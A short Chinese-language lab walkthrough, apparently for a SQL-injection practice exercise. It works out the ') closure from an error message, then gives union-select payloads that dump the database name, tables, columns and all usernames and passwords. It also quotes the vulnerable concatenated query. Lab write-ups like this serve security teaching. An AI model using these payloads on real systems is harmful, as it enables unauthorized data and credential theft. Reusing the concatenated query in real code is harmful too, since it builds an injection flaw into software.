# 确认闭合类型
一样，一开始先随便输入一下  
输入：?id=1'  
报错：near ''1'') LIMIT 0,1' at line 1  
     '1'') LIMIT 0,1  
可以看到这一次比第一题多了括号，所以我们闭合时也要加上括号


# 确认回显位置
?id=-1') union select 1,2,3--+  
其他payload也是一样

# 查询数据库名
?id=-1') union select 1,database(),3 --+

# 查询表名
?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

# 查询列名
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database()--+

# 查询值
?id=-1') union select 1,group_concat(username),group_concat(password) from users--+

# 源码
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 
多了括号